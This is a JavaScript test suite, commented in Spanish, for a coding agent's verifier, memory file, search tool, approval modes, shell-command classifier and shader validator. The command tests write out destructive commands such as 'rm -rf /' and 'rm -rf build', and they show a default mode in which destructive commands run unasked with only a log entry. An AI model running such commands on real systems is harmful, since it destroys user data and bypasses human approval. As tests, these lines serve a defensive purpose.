        const v = mkV(spy, { 'agent.verifyCommand': 'npm run check' });
        const pedidas = [];
        await v.projectCheck({ requestApproval: async (r) => { pedidas.push(r); return true; } });
        eq('un comando configurado no pregunta', pedidas.length, 0);
        eq('y sí se ejecuta', spy.llamadas.length, 1);
    }

    // Línea base: sin ella, un repositorio cuyos tests ya estaban rojos por algo
    // ajeno (faltan dependencias, hace falta una base de datos, un test
    // inestable) convertía en fallo TODOS los pasos que tocaran un archivo, cada
    // uno reintentado tres veces ejecutando la suite entera. Verificar es
    // detectar una regresión, y una regresión no existe sin línea base.
    {
        const spy = mkExec([1]);            // ya estaba en rojo
        const v = mkV(spy);
        const base = await v.captureBaseline({ requestApproval: async () => true });
        eq('la línea base detecta que ya estaba roja', base, 'red');

        const r = await v.projectCheck({ requestApproval: async () => true });
        eq('con la suite ya roja no se culpa al paso', r.ran, false);
        ok('y se explica', /ya fallaba antes/i.test(r.reason), r.reason);
        eq('ni se vuelve a ejecutar la suite', spy.llamadas.length, 1);
    }
    {
        const spy = mkExec([0, 1]);         // pasaba, y luego se rompe
        const v = mkV(spy);
        eq('la línea base detecta que estaba verde', await v.captureBaseline({ requestApproval: async () => true }), 'ok');
        const r = await v.projectCheck({ requestApproval: async () => true });
        eq('un fallo posterior SÍ es una regresión', [r.ran, r.ok], [true, false]);
    }
}

// ── memoria: no pisar lo que escribe el usuario ───────────────────────────
section('revisión/memoria');
{
    const disco = new Map();
    const platform = {
        fs: {
            readText: async (p) => { if (!disco.has(p)) throw new Error('ENOENT'); return disco.get(p); },
            writeText: async (p, c) => { disco.set(p, c); }
        }
    };
    const cfg = { get: (k, fb) => ({ 'workspace.root': 'C:/R' }[k] ?? fb) };
    const ruta = 'C:/R/.rubus/memory.md';
    const NOTA = '# NOTAS MÍAS (no borrar)\nEl staging necesita VPN. Nunca ejecutes deploy.sh aquí.';

    // El archivo invita a editarlo, y el sitio natural para clavar una nota es
    // arriba del todo — justo donde el parseo la tiraba y el siguiente record()
    // la borraba del disco sin avisar.
    disco.set(ruta, `${NOTA}\n\n## 2026-01-01 — algo\n- resultado: 1/1 pasos\n`);
    const mem = new ProjectMemory({ platform, config: cfg, logger: null });
    await mem.load({ force: true });
    await mem.record({ task: 'otra tarea', plan: createPlan('x', [{ title: 't', description: 'd', verify: 'v' }]), changes: [] });
    ok('la nota del usuario sobrevive a record()', disco.get(ruta).includes('no borrar'), disco.get(ruta).slice(0, 200));
    ok('y sigue completa', disco.get(ruta).includes('deploy.sh'));
    ok('sin duplicar nuestra cabecera', disco.get(ruta).split('# Memoria de Rubus').length === 2);

    // Un memory.md escrito entero a mano, sin ninguna entrada nuestra, se
    // perdía completo en el primer record().
    disco.set(ruta, NOTA);
    const mem2 = new ProjectMemory({ platform, config: cfg, logger: null });
    await mem2.load({ force: true });
    await mem2.record({ task: 'x', plan: createPlan('x', [{ title: 't', description: 'd', verify: 'v' }]), changes: [] });
    ok('un archivo sólo con notas del usuario no se arrasa', disco.get(ruta).includes('deploy.sh'), disco.get(ruta).slice(0, 200));

    // El tope de tokens tiene que ser un tope, también para una entrada sola:
    // un memory.md editado a mano con un bloque enorme llegaba a 35.000 tokens
    // frente a los 700 declarados y colapsaba la ventana de contexto.
    disco.set(ruta, `## entrada gigante\n${'texto de relleno '.repeat(8000)}`);
    const mem3 = new ProjectMemory({ platform, config: cfg, logger: null });
    await mem3.load({ force: true });
    const t = estimateTokens(mem3.block());
    ok('una entrada enorme se recorta al tope', t < 1000, `${t} tokens`);
    ok('pero sigue diciendo algo', mem3.block().includes('entrada gigante'));
}

// ── búsqueda: el cupo no puede esconder la definición ─────────────────────
section('revisión/búsqueda con muchos usos');
{
    const { searchCodebase } = await import('../core/tools/search-tools.js');

    // 80 archivos que USAN el símbolo, ordenados antes por alfabeto, y uno al
    // final que lo DECLARA. Con el corte duro al llenar el cupo, el archivo de
    // la declaración nunca llegaba a leerse: el mismo fallo de antes, movido de
    // 30 a 400.
    const ficheros = {};
    for (let i = 0; i < 80; i++) {
        ficheros[`C:/R/a${String(i).padStart(2, '0')}.js`] =
            Array.from({ length: 8 }, () => 'objetivo();').join('\n') + '\n';
    }
    ficheros['C:/R/zzz-define.js'] = 'export function objetivo(n) {\n    return n;\n}\n';

    const ctx = {
        root: 'C:/R', signal: null, config: { get: (k, fb) => fb },
        platform: {
            fs: {
                stat: async (p) => (ficheros[p] ? { isFile: true, isDirectory: false, size: ficheros[p].length } : null),
                readText: async (p) => ficheros[p] || '',
                readDir: async (p) => (p === 'C:/R'
                    ? Object.keys(ficheros).map(path => ({ name: P.basename(path), path, isDirectory: false }))
                    : [])
            }
        }
    };

    const r = await searchCodebase.run({ query: 'objetivo', max_results: 10 }, ctx);
    ok('la definición aparece pese a los 80 archivos que lo usan',
        r.data.matches.some(m => m.rel === 'zzz-define.js' && m.definition), r.summary);
    eq('y va la primera', r.data.matches[0].rel, 'zzz-define.js');
    ok('la navegación apunta a la definición', r.detail.includes('read_file(path="zzz-define.js"'), r.detail.slice(-200));

    // Cuentas honestas: el resumen contaba archivos que ni se mostraban, y el
    // "… y N más en este archivo" se calculaba antes del recorte global. El
    // modelo leía que ya lo había visto todo y daba el archivo por revisado.
    const pocos = {};
    for (let i = 0; i < 10; i++) {
        pocos[`C:/R/f${i}.js`] = Array.from({ length: 9 }, () => 'usa(objetivo);').join('\n') + '\n';
    }
    const ctx2 = { ...ctx, platform: { fs: {
        stat: async (p) => (pocos[p] ? { isFile: true, isDirectory: false, size: pocos[p].length } : null),
        readText: async (p) => pocos[p] || '',
        readDir: async (p) => (p === 'C:/R'
            ? Object.keys(pocos).map(path => ({ name: P.basename(path), path, isDirectory: false }))
            : [])
    } } };

    const r2 = await searchCodebase.run({ query: 'objetivo', max_results: 8 }, ctx2);
    const mostrados = new Set(r2.data.matches.map(m => m.rel)).size;
    ok('el resumen cuenta los archivos que se muestran',
        r2.summary.includes(`en ${mostrados} archivo`), r2.summary);
    ok('y avisa de que hay más', /se muestran 8 de \d+ coincidencias/.test(r2.detail), r2.detail.slice(-260));

    // El "… y N más" de un archivo cuenta también lo que se llevó el recorte.
    const porArchivo = new Map();
    for (const m of r2.data.matches) porArchivo.set(m.rel, (porArchivo.get(m.rel) || 0) + 1);
    const [relPrimero, mostradasPrimero] = [...porArchivo.entries()][0];
    const anunciadas = Number((r2.detail.match(/… y (\d+) coincidencia\(s\) más en este archivo/) || [])[1] || 0);
    eq(`las ocultas de ${relPrimero} cuadran con las 9 reales`, mostradasPrimero + anunciadas, 9);
}

// ── modo de aprobación ────────────────────────────────────────────────────
// Un solo interruptor decide toda la fricción. Antes estaba repartido en cuatro
// ajustes leídos desde tres archivos, y "¿esto se va a parar a preguntar?" no
// se podía responder mirando a un sitio.
section('aprobación/modo');
{
    const { approvalPolicy, DEFAULTS: D } = await import('../core/config.js');
    const cfg = (over = {}) => ({ get: (k, fb) => (k in over ? over[k] : fb) });

    eq('el defecto es automático', D.agent.approvalMode, 'auto');

    const auto = approvalPolicy(cfg());
    eq('en auto el plan se aprueba solo', auto.plan, true);
    eq('en auto los pasos se encadenan', auto.steps, true);
    eq('en auto los comandos ordinarios no preguntan', auto.cautionCommands, true);
    eq('en auto la verificación detectada no pregunta', auto.verifyCommand, true);

    const manual = approvalPolicy(cfg({ 'agent.approvalMode': 'manual' }));
    eq('en manual el plan se aprueba a mano', manual.plan, false);
    eq('en manual los pasos van uno a uno', manual.steps, false);
    eq('en manual los comandos ordinarios preguntan', manual.cautionCommands, false);
    eq('en manual la verificación detectada pregunta', manual.verifyCommand, false);

    // Atado de punta a punta: 'auto' vive en DEFAULTS y también como valor de
    // respaldo dentro de approvalPolicy(). Si alguien cambia uno y no el otro,
    // divergen en silencio; esto los compara con una Config de verdad.
    {
        const { Config } = await import('../core/config.js');
        const real = new Config({ storage: { get: async () => null, set: async () => {} } });
        await real.load();
        const p = approvalPolicy(real);
        eq('una Config recién cargada aprueba sola', [p.auto, p.plan, p.steps], [true, true, true]);
    }

    // Los de sólo lectura no dependen del modo: nunca han preguntado.
    eq('los comandos seguros siguen sin preguntar en manual', manual.safeCommands, true);

    // El afinado fino sigue mandando sobre el modo, que es lo que permite al
    // componente embebido pedir exactamente lo que quiere.
    eq('un override explícito gana al modo',
        approvalPolicy(cfg({ 'agent.approvalMode': 'auto', 'agent.autoApprovePlan': false })).plan, false);
    eq('y al revés también',
        approvalPolicy(cfg({ 'agent.approvalMode': 'manual', 'agent.autoRunSteps': true })).steps, true);

    // En manual, `confirmDangerous` vuelve a tener efecto sobre los CAUTION.
    eq('en manual se puede aflojar con confirmDangerous',
        approvalPolicy(cfg({ 'agent.approvalMode': 'manual', 'security.confirmDangerous': false })).cautionCommands, true);

    eq('en auto los destructivos tampoco preguntan', auto.dangerousCommands, true);
    eq('en manual los destructivos preguntan', manual.dangerousCommands, false);

    // La postura intermedia, que es la más común de las tres: automático para
    // todo menos para lo que no se deshace. Con un solo interruptor no se podría
    // expresar, y por eso 'destructive' va aparte de 'caution'.
    const casiTodo = approvalPolicy(cfg({ 'agent.approvalMode': 'auto', 'security.confirmDestructive': true }));
    eq('se puede pedir auto excepto lo destructivo', [casiTodo.cautionCommands, casiTodo.dangerousCommands], [true, false]);

    // Y al revés, por si alguien quiere manual pero sin diálogos de rm.
    eq('y manual con los destructivos sueltos',
        approvalPolicy(cfg({ 'agent.approvalMode': 'manual', 'security.confirmDestructive': false })).dangerousCommands, true);
}

// ── los destructivos preguntan en los dos modos ───────────────────────────
section('aprobación/comandos');
{
    const { runTerminalCommand } = await import('../core/tools/shell-tools.js');
    const { Security } = await import('../core/security.js');

    const correr = async (command, modo, over = {}) => {
        const cfg = {
            get: (k, fb) => ({
                'agent.approvalMode': modo,
                'workspace.root': 'C:/R',
                'security.allowShell': true,
                ...over
            }[k] ?? fb)
        };
        const pedidas = [];
        const ejecutados = [];
        const avisos = [];
        await runTerminalCommand.run({ command }, {
            config: cfg,
            security: new Security(cfg),
            root: 'C:/R',
            signal: null,
            bus: { emit: () => {} },
            logger: { warn: (msg, data) => avisos.push({ msg, data }), info: () => {}, debug: () => {}, error: () => {} },
            requestApproval: async (req) => { pedidas.push(req); return true; },
            platform: {
                exec: async (c) => {
                    ejecutados.push(c);
                    return { stdout: '', stderr: '', exitCode: 0, timedOut: false, aborted: false, durationMs: 1 };
                }
            }
        });
        return { pregunto: pedidas.length > 0, riesgo: pedidas[0]?.risk, ejecutados, avisos };
    };

    const seguroAuto = await correr('git status', 'auto');
    eq('SAFE en auto no pregunta', seguroAuto.pregunto, false);
    const seguroManual = await correr('git status', 'manual');
    eq('SAFE en manual tampoco', seguroManual.pregunto, false);

    const ordinarioAuto = await correr('npm install', 'auto');
    eq('CAUTION en auto no pregunta', ordinarioAuto.pregunto, false);
    eq('y se ejecuta', ordinarioAuto.ejecutados.length, 1);

    const ordinarioManual = await correr('npm install', 'manual');
    eq('CAUTION en manual sí pregunta', ordinarioManual.pregunto, true);

    // Destructivos: en auto se ejecutan, en manual preguntan.
    const rmAuto = await correr('rm -rf build', 'auto');
    eq('rm -rf en auto no pregunta', rmAuto.pregunto, false);
    eq('y se ejecuta', rmAuto.ejecutados.length, 1);

    const rmManual = await correr('rm -rf build', 'manual');
    eq('rm -rf en manual pregunta', rmManual.pregunto, true);
    eq('y se marca como peligroso', rmManual.riesgo, 'dangerous');

    eq('git push en auto no pregunta', (await correr('git push origin main', 'auto')).pregunto, false);

    // Sin diálogo, pero con rastro: es la única forma de responder después a
    // "¿qué ejecutó exactamente?".
    ok('un destructivo sin diálogo deja aviso en el registro',
        rmAuto.avisos.some(a => /destructivo/i.test(a.msg) && a.msg.includes('rm -rf build')),
        JSON.stringify(rmAuto.avisos));
    ok('el aviso dice por qué se graduó así',
        rmAuto.avisos.some(a => /borra archivos/i.test(a.data?.motivo || '')), JSON.stringify(rmAuto.avisos));
    eq('un comando ordinario no genera ese aviso', ordinarioAuto.avisos.length, 0);

    // La lista de prohibidos no la levanta ningún modo.
    const bloqueado = await correr('rm -rf /', 'auto');
    eq('un comando bloqueado no se ejecuta ni en auto', bloqueado.ejecutados.length, 0);
    eq('y tampoco pregunta: simplemente no se hace', bloqueado.pregunto, false);

    // Y la postura intermedia, comprobada de verdad y no sólo en la política.
    const conFreno = await correr('rm -rf build', 'auto', { 'security.confirmDestructive': true });
    eq('con confirmDestructive el rm vuelve a preguntar en auto', conFreno.pregunto, true);
    eq('pero npm install sigue sin preguntar', (await correr('npm install', 'auto', { 'security.confirmDestructive': true })).pregunto, false);
}

// ── verificación detectada según el modo ──────────────────────────────────
section('aprobación/verificación detectada');
{
    const mkVerifier = (modo) => {
        const llamadas = [];
        const avisos = [];
        const v = new Verifier({
            platform: {
                exec: async (cmd) => {
                    llamadas.push(cmd);
                    return { stdout: '', stderr: '', exitCode: 0, timedOut: false, aborted: false, durationMs: 1 };
                }
            },
            config: { get: (k, fb) => ({ 'workspace.root': 'C:/R', 'agent.approvalMode': modo }[k] ?? fb) },
            security: { classifyCommand: () => ({ risk: 'caution' }) },
            logger: { info: () => {}, warn: (m) => avisos.push(m), debug: () => {}, error: () => {} },
            repoMap: { cache: { conventions: { testCommand: 'npm test' } } }
        });
        return { v, llamadas, avisos };
    };

    // En auto se ejecuta sin diálogo — es lo que se pidió — pero NO en silencio.
    const a = mkVerifier('auto');
    const pedidasAuto = [];
    const r = await a.v.projectCheck({ requestApproval: async (req) => { pedidasAuto.push(req); return true; } });
    eq('en auto no hay diálogo', pedidasAuto.length, 0);
    eq('y se ejecuta', [r.ran, r.ok], [true, true]);
    ok('pero queda avisado en el registro', a.avisos.some(m => /sin preguntar/i.test(m)), a.avisos.join(' | '));
    ok('el aviso nombra el comando', a.avisos.some(m => m.includes('npm test')));
    ok('y dice cómo volver a que pregunte', a.avisos.some(m => /manual/i.test(m)));

    // Y sólo se avisa una vez, no en cada paso.
    await a.v.projectCheck({});
    eq('el aviso no se repite en cada paso', a.avisos.filter(m => /sin preguntar/i.test(m)).length, 1);
    eq('pero la verificación sí vuelve a correr', a.llamadas.length, 2);

    // En manual vuelve el diálogo.
    const m = mkVerifier('manual');
    const pedidasManual = [];
    await m.v.projectCheck({ requestApproval: async (req) => { pedidasManual.push(req); return true; } });
    eq('en manual sí hay diálogo', pedidasManual.length, 1);
}

// ── estudio de diseño: GLSL ───────────────────────────────────────────────
// Lo que se comprueba aquí es lo mismo que en security.js, con otro lenguaje:
// que el modelo no pueda colar algo que cuelgue la máquina, y que cuando se
// equivoque se lo digamos de forma que pueda arreglarlo.
section('diseño/glsl');
{
    const { validateShaderBody, checkLoops, wrapFragment, explainCompileError, MARCA_CUERPO } =
        await import('../core/design/glsl.js');

    const bueno = 'vec2 p = uv - 0.5;\nfloat d = length(p);\ncolor = mix(uColorA, uColorB, d);';
    ok('un cuerpo válido pasa', validateShaderBody(bueno).ok, validateShaderBody(bueno).errors.join(' · '));

    // La única regla que no es de estilo: un bucle sin tope escrito puede
    // colgar la GPU, y Windows se lleva la pestaña por delante con el TDR.
    ok('se rechaza un for sin tope literal',
        !validateShaderBody('for (int i = 0; i < n; i++) { color += 0.1; }').ok);
    ok('se rechaza un bucle enorme',
        !validateShaderBody('for (int i = 0; i < 5000; i++) { color += 0.001; }').ok);
    ok('se acepta un bucle acotado',
        validateShaderBody('for (int i = 0; i < 8; i++) { color += 0.1; }').ok);
    ok('se rechaza while', !validateShaderBody('while (true) { color = vec3(1.0); }').ok);

    // Anidar bucles pequeños multiplica: 64×64 por píxel ya es demasiado.
    eq('los bucles anidados multiplican',
        checkLoops('for (int i = 0; i < 40; i++) { for (int j = 0; j < 40; j++) { } }').product, 1600);
    ok('y se rechazan si el producto se dispara',
        !validateShaderBody('for (int i = 0; i < 64; i++) { for (int j = 0; j < 64; j++) { color += 0.0001; } }').ok);
    ok('pero un kernel razonable pasa',
        validateShaderBody('for (int i = 0; i < 16; i++) { for (int j = 0; j < 16; j++) { color += 0.001; } }').ok);

    // Contrato con el envoltorio.
    ok('se rechaza declarar main()', !validateShaderBody('void main() { color = vec3(1.0); }').ok);
    ok('se rechaza declarar uniforms', !validateShaderBody('uniform float x;\ncolor = vec3(x);').ok);
    ok('se rechaza escribir gl_FragColor', !validateShaderBody('gl_FragColor = vec4(1.0);').ok);
    ok('se rechaza el preprocesador', !validateShaderBody('#define X 1\ncolor = vec3(1.0);').ok);

    // Un shader que compila pero nunca asigna color pinta negro, y eso parece
    // una decisión estética en vez de un fallo. Se caza antes de la GPU.
    ok('se rechaza no asignar color', !validateShaderBody('float x = uv.x * 2.0;').ok);
    ok('vale asignar por componentes', validateShaderBody('color.r = uv.x;').ok);

    // Un `while` comentado no es un while.
    ok('los comentarios no disparan falsos positivos',
        validateShaderBody('// while (true) esto es prosa\ncolor = vec3(1.0);').ok);

    // El envoltorio y la marca que permite traducir las líneas del compilador.
    const envuelto = wrapFragment(bueno);
    ok('el envoltorio declara las uniforms', envuelto.includes('uniform float uTime;'));
    ok('el envoltorio trae los ayudantes', envuelto.includes('float fbm2(') && envuelto.includes('vec3 palette3('));
    ok('la marca va como declaración, no como comentario',
        envuelto.includes(`float ${MARCA_CUERPO} = 0.0;`) && !envuelto.includes(`// ${MARCA_CUERPO}`));

    // El driver numera sobre la fuente entera; el modelo sólo conoce la suya.
    // Sin esta traducción, "error en la línea 145" no le sirve de nada.
    const compilada = ['#version 300 es', '#define A', 'void main() {', `  float ${MARCA_CUERPO} = 0.0;`, '  linea1', '  linea2'].join('\n');
    const explicado = explainCompileError("ERROR: 0:6: 'x' : undeclared identifier", 'primera linea\nsegunda linea', compilada);
    ok('el error se traduce a la línea del modelo', explicado.includes('línea 2'), explicado);
    ok('y cita el código de esa línea', explicado.includes('segunda linea'), explicado);
    ok('conservando el mensaje del driver', explicado.includes('undeclared identifier'), explicado);
}

// ── estudio de diseño: composición ────────────────────────────────────────
section('diseño/composición');
{
    const { parseComposition, normalizeColor, colorToVec3, createComposition, compositionToText } =
        await import('../core/design/composition.js');

    eq('#fff se expande', normalizeColor('#fff'), '#ffffff');
    eq('sin almohadilla también', normalizeColor('AABBCC'), '#aabbcc');
    eq('rgb() se convierte', normalizeColor('rgb(255, 0, 128)'), '#ff0080');
    eq('los nombres en español se entienden', normalizeColor('rojo'), '#e5484d');
    eq('y en inglés', normalizeColor('blue'), '#0090ff');
    eq('lo que no es color devuelve el respaldo', normalizeColor('un azul bonito', '#000000'), '#000000');
    eq('a vec3 normalizado', colorToVec3('#ff0000'), [1, 0, 0]);

    // Reparaciones: nada de esto merece un viaje de ida y vuelta al modelo.
    const r = parseComposition(JSON.stringify({
        name: 'X', width: 1024, height: 1024, background: 'negro',
        palette: ['rojo'],
        layers: [
            { text: 'HOLA', size: 120, x: 512, y: 256, color: 'blanco' },
            { type: 'shape', shape: 'pentágono-raro', color: '#fff' },
            { type: 'lo-que-sea', glsl: 'color = vec3(1.0);' }
        ],
        post: [{ effect: 'bloom', amount: 0.5 }, { effect: 'inventado', amount: 1 }]
    }));

    ok('la composición se acepta tras reparar', r.ok, r.errors.join(' · '));
    eq('el tipo se deduce del contenido', r.composition.layers[0].type, 'text');
    eq('los píxeles se pasan a fracción', r.composition.layers[0].x, 0.5);
    eq('el tamaño también', r.composition.layers[0].size, 0.1171875);
    eq('los colores con nombre se traducen', r.composition.background, '#000000');
    eq('una forma inventada cae en circle', r.composition.layers[1].shape, 'circle');
    eq('un type inventado se deduce por el glsl', r.composition.layers[2].type, 'shader');
    eq('un efecto inventado se descarta', r.composition.post.length, 1);
    ok('y se anota lo que se tocó', r.repairs.length >= 3, r.repairs.join(' · '));

    // La paleta siempre tiene tres colores: un uniform sin valor es negro, y
    // "mi degradado sale negro" es un rato perdido en el sitio equivocado.
    eq('la paleta se rellena hasta tres', r.composition.palette.length, 3);

    // Errores de verdad, que sí vuelven al modelo.
    ok('sin capas no hay composición', !parseComposition('{"name":"x","width":512,"height":512,"layers":[]}').ok);
    ok('un texto sin texto es un error',
        !parseComposition('{"name":"x","width":512,"height":512,"layers":[{"type":"text","text":"  "}]}').ok);

    // Un shader inválido no descarta la capa: se conserva para poder pedir la
    // corrección con el error delante.
    const conShaderMalo = parseComposition(JSON.stringify({
        name: 'x', width: 512, height: 512,
        layers: [{ type: 'shader', glsl: 'while (true) {}' }]
    }));
    ok('un shader inválido invalida la composición', !conShaderMalo.ok);
    eq('pero la capa se conserva', conShaderMalo.composition.layers.length, 1);
    eq('marcada como no compilable', conShaderMalo.composition.layers[0].shaderOk, false);

    // El JSON puede venir envuelto en prosa: el modelo no siempre obedece.
    const sucio = parseComposition('Aquí tienes:\n```json\n{"name":"y","width":512,"height":512,"layers":[{"type":"shape"}]}\n```\n¡Espero que te guste!');
    ok('se extrae el JSON de entre la prosa', sucio.ok, sucio.errors.join(' · '));

    // El tamaño se acota: un lienzo de 40000px agota la memoria de la GPU.
    eq('el ancho se acota por arriba', createComposition({ width: 99999, height: 512, layers: [{ type: 'shape' }] }).comp.width, 4096);

    ok('el resumen para el modelo menciona las capas',
        compositionToText(r.composition).includes('CAPAS'), compositionToText(r.composition).slice(0, 80));
}

// ── estudio de diseño: el ciclo de reparación ─────────────────────────────
// La razón de ser del estudio. El modelo no declara el éxito: se mira lo que
// salió por la GPU y, si no vale, se le devuelve el motivo concreto.
section('diseño/verificación y reparación');
{
    const { DesignStudio, STUDIO_STATE } = await import('../core/design/studio.js');
    const { Bus: DBus } = await import('../core/bus.js');

    const cfg = { get: (k, fb) => ({ 'ollama.model': 'falso', 'design.maxRepairs': 2 }[k] ?? fb) };

    /** Un modelo de mentira que devuelve las respuestas que se le den, en orden. */
    const modelo = (respuestas) => {
        const vistas = [];
        let i = 0;
        return {
            vistas,
            chat: async ({ messages }) => {
                vistas.push(messages[messages.length - 1].content);
                return { content: respuestas[Math.min(i++, respuestas.length - 1)] };
            }
        };
    };

    const comp = (extra = {}) => JSON.stringify({
        name: 'p', width: 256, height: 256, background: '#000',
        layers: [{ type: 'shader', glsl: 'color = vec3(1.0);' }], ...extra
    });

    /** Un renderer de mentira: contesta lo que se le diga, sin GPU. */
    const renderer = (salidas) => {
        let i = 0;
        const vistas = [];
        return {
            vistas,
            ready: () => true,
            render: async (c) => { vistas.push(c); return salidas[Math.min(i++, salidas.length - 1)]; },
            snapshot: () => 'data:image/png;base64,x',
            dispose: () => {}
        };
    };

    // 1. Todo bien a la primera.
    {
        const r = renderer([{ ok: true, shaderErrors: [], stats: { coverage: 0.6 } }]);
        const s = new DesignStudio({ ollama: modelo([comp()]), config: cfg, bus: new DBus(), logger: null, renderer: r });
        const out = await s.create('un logo');
        ok('una composición buena se acepta a la primera', out.ok && out.rendered, JSON.stringify(out).slice(0, 120));
        eq('y se renderiza una sola vez', r.vistas.length, 1);
        eq('el estudio queda listo', s.state, STUDIO_STATE.READY);
    }

    // 2. El shader no compila: el log del driver tiene que volver al modelo.
    {
        const m = modelo([comp(), comp()]);
        const r = renderer([
            { ok: true, shaderErrors: [{ layer: 1, log: "línea 2: 'x' : undeclared identifier", glsl: 'color = x;' }], stats: {} },
            { ok: true, shaderErrors: [], stats: { coverage: 0.5 } }
        ]);
        const s = new DesignStudio({ ollama: m, config: cfg, bus: new DBus(), logger: null, renderer: r });
        const out = await s.create('algo con shader');
        ok('un shader roto se repara y acaba bien', out.ok, JSON.stringify(out).slice(0, 120));
        eq('hizo falta un segundo turno', m.vistas.length, 2);
        ok('y el segundo turno lleva el error del compilador',
            (m.vistas[1] || '').includes('undeclared identifier'), (m.vistas[1] || '').slice(0, 200));
        ok('junto al shader que lo provocó', (m.vistas[1] || '').includes('color = x;'));
    }

    // 3. Se renderizó, pero no se ve nada. Es el fallo que el modelo no puede
    //    detectar solo: desde dentro, escribió su JSON y quedó tan tranquilo.
    {
        const m = modelo([comp(), comp()]);
        const r = renderer([
            { ok: true, shaderErrors: [], stats: { coverage: 0.0001 } },
            { ok: true, shaderErrors: [], stats: { coverage: 0.4 } }
        ]);
        const s = new DesignStudio({ ollama: m, config: cfg, bus: new DBus(), logger: null, renderer: r });
        const out = await s.create('un logo');
        ok('un lienzo vacío se detecta y se repara', out.ok, JSON.stringify(out).slice(0, 120));
        ok('y se le dice al modelo que no se ve nada',
            /vacía|no se ve|% de los píxeles/i.test((m.vistas[1] || '')), (m.vistas[1] || '').slice(0, 200));
    }

    // 4. Sin motor de render la composición sigue valiendo: se enseña el JSON.
    {
        const s = new DesignStudio({ ollama: modelo([comp()]), config: cfg, bus: new DBus(), logger: null, renderer: null });
        const out = await s.create('un logo');
        ok('sin motor se devuelve la composición igualmente', out.ok && !out.rendered, JSON.stringify(out).slice(0, 120));
    }

    // 5. Se agotan los intentos: se informa, y se conserva lo último para que
    //    el usuario vea algo en lugar de un panel en blanco.
    {
        const r = renderer([{ ok: true, shaderErrors: [{ layer: 1, log: 'roto', glsl: 'x' }], stats: {} }]);
        const s = new DesignStudio({ ollama: modelo([comp()]), config: cfg, bus: new DBus(), logger: null, renderer: r });
        const out = await s.create('un logo');
        ok('tras agotar los intentos se falla explícitamente', !out.ok && /intentos/.test(out.error), JSON.stringify(out).slice(0, 140));
        ok('pero queda la última composición a la vista', !!out.composition);
        eq('se intentó el número de veces configurado', r.vistas.length, 3);
    }

    // 6. Refinar parte de lo que hay: si rehiciera desde cero, cada iteración
    //    perdería algo de lo anterior.
    {
        const m = modelo([comp(), comp({ name: 'refinado' })]);
        const r = renderer([{ ok: true, shaderErrors: [], stats: { coverage: 0.5 } }]);
        const s = new DesignStudio({ ollama: m, config: cfg, bus: new DBus(), logger: null, renderer: r });
        await s.create('un logo');
        await s.refine('más oscuro');
        ok('refinar le enseña la composición actual', (m.vistas[1] || '').includes('COMPOSICIÓN'), (m.vistas[1] || '').slice(0, 120));
        ok('y le pide cambiar sólo lo pedido', /sólo lo necesario|EXACTAMENTE igual/i.test((m.vistas[1] || '')));
    }

    // La composición de arranque tiene que ser válida: es lo primero que se ve.
    {
        const inicial = DesignStudio.starter();
        ok('la composición de arranque es válida', inicial.layers.length > 0 && !!inicial.background);
    }
}

// ── lo que encontró la segunda revisión adversarial ───────────────────────
// 37 hallazgos confirmados sobre ~5.000 líneas. Los que dejaron marca aquí son
// los que volverían solos si alguien "simplifica": las regresiones que trajo la
// aprobación automática y los agujeros del validador de shaders.
section('rev2/aprobación como barrera');
{
    const { approvalPolicy: pol } = await import('../core/config.js');
    const cfg = (m) => ({ get: (k, fb) => (k in m ? m[k] : fb) });

    // El conmutador Plan/Act de la interfaz fija los ajustes finos, y los
    // ajustes finos GANAN al modo. Sin eso, mandar una tarea en «Plan (sólo
    // lectura)» escribía archivos en disco: `send()` no miraba el modo y
    // `engine.start()` se aprobaba el plan solo.
    const planUi = pol(cfg({ 'agent.approvalMode': 'auto', 'agent.autoApprovePlan': false, 'agent.autoRunSteps': false }));
    eq('el modo Plan impide la auto-aprobación', [planUi.plan, planUi.steps], [false, false]);
    ok('aunque el modo global sea auto', planUi.auto === true);

    const actUi = pol(cfg({ 'agent.approvalMode': 'auto' }));
    eq('en Act manda el modo otra vez', [actUi.plan, actUi.steps], [true, true]);

    // Tres estados, porque son tres cosas distintas y una casilla sólo sabía
    // decir dos: con el booleano ausente la interfaz se dibujaba «no confirmar»
    // mientras el motor sí preguntaba.
    eq('segun-modo sigue al modo', pol(cfg({ 'agent.approvalMode': 'manual' })).dangerousCommands, false);
    eq('siempre pregunta aun en auto',
        pol(cfg({ 'agent.approvalMode': 'auto', 'security.confirmDestructive': 'siempre' })).dangerousCommands, false);
    eq('nunca no pregunta aun en manual',
        pol(cfg({ 'agent.approvalMode': 'manual', 'security.confirmDestructive': 'nunca' })).dangerousCommands, true);
    eq('un booleano viejo guardado se sigue entendiendo',
        pol(cfg({ 'security.confirmDestructive': true })).dangerousCommands, false);
}

section('rev2/verificación: estado que no puede quedarse pegado');
{
    const { Verifier } = await import('../core/verify.js');
    const mk = (respuestas, over = {}) => {
        const llamadas = [];
        let i = 0;
        return {
            llamadas,
            v: new Verifier({
                platform: { exec: async (cmd) => { llamadas.push(cmd); return { stdout: '', stderr: '', exitCode: respuestas[Math.min(i++, respuestas.length - 1)], aborted: false, durationMs: 1 }; } },
                config: { get: (k, fb) => ({ 'workspace.root': 'C:/R', ...over }[k] ?? fb) },
                security: { classifyCommand: (c) => ({ risk: over.__bloquea === c ? 'blocked' : 'caution' }) },
                logger: null,
                repoMap: { cache: { conventions: { testCommand: 'npm test' } } }
            })
        };
    };

    // La línea base se saltaba `classifyCommand` entera: un comando que el
    // usuario había metido en «Comandos prohibidos» —cuya ayuda promete que no
    // se ejecuta nunca— sí se ejecutaba aquí.
    {
        const { v, llamadas } = mk([0], { __bloquea: 'npm test' });
        await v.captureBaseline({ requestApproval: async () => true });
        eq('un comando bloqueado tampoco se ejecuta como línea base', llamadas.length, 0);
    }

    // El estado caducaba: una suite roja en la tarea 1 desactivaba la
    // verificación para siempre, y una verde medida en OTRO proyecto hacía que
    // el primer fallo del nuevo se le atribuyera al agente.
    {
        const { v } = mk([1]);
        eq('la línea base detecta el rojo', await v.captureBaseline({ requestApproval: async () => true }), 'red');
        v.reset({ keepAuthorizations: true });
        eq('reset la olvida', v._baseline, null);
        ok('y conserva el permiso si se le pide', v._authorized.size > 0);
        v.reset();
        eq('sin keepAuthorizations también olvida el permiso', v._authorized.size, 0);
    }
}

section('rev2/shaders: los dos agujeros del validador');
{
    const { validateShaderBody, checkLoops } = await import('../core/design/glsl.js');

    // Un bucle DESCENDENTE lleva sus vueltas en la inicialización. Leyendo sólo
    // el lado derecho de la comparación, `i > 0` daba n=0: el mismo bucle que se
    // rechaza escrito hacia arriba se colaba entero escrito hacia abajo, y eso
    // es exactamente lo que cuelga la GPU.
